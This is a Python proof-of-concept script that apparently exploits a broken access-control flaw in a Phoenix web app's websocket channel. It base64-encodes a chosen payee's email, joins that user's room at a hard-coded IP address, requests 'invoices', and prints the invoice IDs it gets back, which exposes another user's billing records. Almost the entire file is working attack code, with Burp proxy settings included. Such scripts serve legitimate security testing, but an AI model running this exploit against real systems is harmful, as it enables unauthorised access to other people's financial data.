# view a payees invoice based on the payee's email

import asyncio
import json
import re
import time
import urllib.parse
import requests
import websockets
from bs4 import BeautifulSoup
import urllib.parse
import base64

url = "http://138.197.38.125:4001/"

headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

proxies = {
    'http': 'http://127.0.0.1:8080',
}

burp_proxy_flag = False


def remove_spaces_from_json(obj):
    if isinstance(obj, dict):
        # Recursively remove spaces from dictionary
        return {key: remove_spaces_from_json(value) for key, value in obj.items()}
    elif isinstance(obj, list):
        # Recursively remove spaces from list elements
        return [remove_spaces_from_json(element) for element in obj]
    elif isinstance(obj, str):
        # Remove spaces from string values
        return obj.replace(" ", "")
    else:
        return obj


def convert_email(email):
    # Original string
    original_string = email

    # Step 1: Convert the string to bytes
    string_bytes = original_string.encode('utf-8')

    # Step 2: Base64 encode the bytes
    base64_encoded_bytes = base64.b64encode(string_bytes)

    # Step 3: Convert the encoded bytes to a string
    base64_encoded_string = base64_encoded_bytes.decode('utf-8')

    # Step 4: Add proper padding (not really needed, but shown for demonstration)
    # Calculate the length of the encoded string
    encoded_length = len(base64_encoded_string)

    # If the length is not a multiple of 4, add padding
    if encoded_length % 4 != 0:
        padding_needed = 4 - (encoded_length % 4)
        base64_encoded_string += "=" * padding_needed

    return base64_encoded_string


#  websocket_requests(topic_number, initial_sequence_number, encoded_email))
async def websocket_requests(topic_number, initial_sequence_number, encoded_email):
    # print(f"[+] websocket flow")

    seq = str(initial_sequence_number)
    ws_url = "ws://138.197.38.125:4001/socket/websocket?token=undefined&vsn=2.0.2"
    #
    ws_headers = {
        # "Cookie": f"_frat_test_web_user_tracker={session.cookies['_frat_test_web_user_tracker']};_frat_test_v2_key={session.cookies['_frat_test_v2_key']}",
        # "Upgrade": "websocket",
        "Origin": "http://138.197.38.125:4001",
    }

    full_room_name = "room:" + encoded_email

    async with websockets.connect(ws_url, extra_headers=ws_headers) as websocket:
        phx_join_data = [
            str(topic_number),
            seq,
            full_room_name,
            "phx_join",
            {

            }
        ]
        # Remove spaces from JSON data
        cleaned_data = remove_spaces_from_json(phx_join_data)
        # Convert cleaned JSON data back to string
        json_data = json.dumps(cleaned_data, separators=(',', ':'))
        # Send the data
        # print(f"\n Sent message: {json_data}")
        await websocket.send(json_data)
        message = await websocket.recv()
        # print(f"Received message: {message}")

        seq = str(int(initial_sequence_number) + 1)
        # new_msg request
        new_msg_event = [
            str(topic_number),
            seq,
            full_room_name,
            "new_msg",
            {
                "body": "invoices"
            }
        ]

        cleaned_data = remove_spaces_from_json(new_msg_event)
        # Convert cleaned JSON data back to string
        json_data = json.dumps(cleaned_data, separators=(',', ':'))
        # print(f"\n Sent message: {json_data}")
        await websocket.send(json_data)
        message = await websocket.recv()
        # print(f"Received message: {message}")

        # receive the second message
        message = await websocket.recv()
        # print(f"Received message: {message}")

        await websocket.close()

        input_string = message
        # Regular expression pattern to match UUIDs
        pattern = r"Invoice Id: ([a-f0-9-]{36})"

        # Find all matches of the pattern in the string
        invoice_ids = re.findall(pattern, input_string)

        return invoice_ids


if __name__ == '__main__':

    email = "g+s+1@test.com"

    encoded_email = convert_email(email)

    # accept same number
    topic_number = initial_sequence_number = 3

    invoices = asyncio.run(
        websocket_requests(topic_number, initial_sequence_number, encoded_email))

    print(f"\nInvoices for: {email}\n")
    for i, invoice in enumerate(invoices):
        print(f"{i+1}. {invoice}")
